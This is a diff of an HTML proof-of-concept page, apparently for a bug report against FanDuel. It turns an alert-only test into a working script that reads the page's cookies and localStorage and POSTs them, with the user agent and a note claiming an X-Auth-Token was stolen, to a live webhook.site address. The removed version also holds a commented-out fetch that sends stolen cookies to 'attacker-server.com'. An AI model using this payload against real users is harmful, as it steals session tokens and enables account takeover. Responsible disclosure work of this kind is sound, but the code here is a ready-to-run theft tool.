@@ -1,24 +1,36 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>PoC</title>
-</head>
+<head><title>FanDuel PoC</title></head>
 <body>
-    <h1>Arbitrary JavaScript Execution</h1>
-    <script>
-        // 1. Verify Execution
-        alert("Vulnerability Confirmed: JavaScript is executing!");
-        
-        // 2. Demonstrate Data Access (Example)
-        // If the app sets cookies or uses localStorage for this domain, we can steal them.
-        // var cookies = document.cookie;
-        // var localStorageContent = localStorage.getItem('someKey');
-        
-        // 3. Send data to attacker (Simulated)
-        // fetch('https://attacker-server.com/steal?data=' + encodeURIComponent(cookies));
-        
-        console.log("Attacker script loaded successfully.");
-    </script>
-    <p>If you see this alert, the vulnerability exists.</p>
+<h2>FanDuel Cookie Theft PoC</h2>
+<script>
+  // Steal FanDuel's session cookies
+  var stolen_cookies = document.cookie;
+  var stolen_storage = JSON.stringify(localStorage);
+  
+  // YOUR webhook URL
+  var webhook = "https://webhook.site/0090a7a3-5953-4053-b2f1-3498b6d1aae6";
+  
+  // Send stolen data to webhook
+  fetch(webhook, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      cookies: stolen_cookies,
+      localStorage: stolen_storage,
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      proof: "FanDuel IGNORE_WHITELIST bypass - X-Auth-Token stolen"
+    })
+  });
+
+  // Display on screen as visual proof for screen recording
+  document.body.innerHTML += 
+    "<hr><b>Stolen Cookies:</b><br>" +
+    "<pre style='color:red'>" + stolen_cookies + "</pre>" +
+    "<b>LocalStorage:</b><br>" +
+    "<pre style='color:red'>" + stolen_storage + "</pre>" +
+    "<b>Timestamp:</b> " + new Date().toISOString();
+</script>
 </body>
 </html>
